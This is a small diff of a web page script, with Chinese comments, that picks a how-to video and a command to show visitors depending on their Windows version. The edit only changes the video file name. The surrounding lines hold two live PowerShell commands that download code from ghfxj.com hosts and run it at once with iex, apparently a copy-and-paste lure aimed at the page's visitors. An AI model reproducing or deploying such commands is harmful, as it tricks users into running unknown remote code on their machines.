@@ -50,7 +50,7 @@
             } // 非Windows系统默认false，视为旧系统
 
             // 2. 根据系统版本设置视频源、命令和成功提示
-            var videoSrc = isWin10OrHigher ? './X.mp4' : './7.mp4';
+            var videoSrc = isWin10OrHigher ? './0.mp4' : './7.mp4';
             var cmdText = isWin10OrHigher 
                 ? 'irm x.ghfxj.com | iex' 
                 : '$h=New-Object -C Msxml2.XMLHTTP;$h.open(\'GET\',\'https://x7.ghfxj.com\',0);$h.send();$h.responseText|iex';
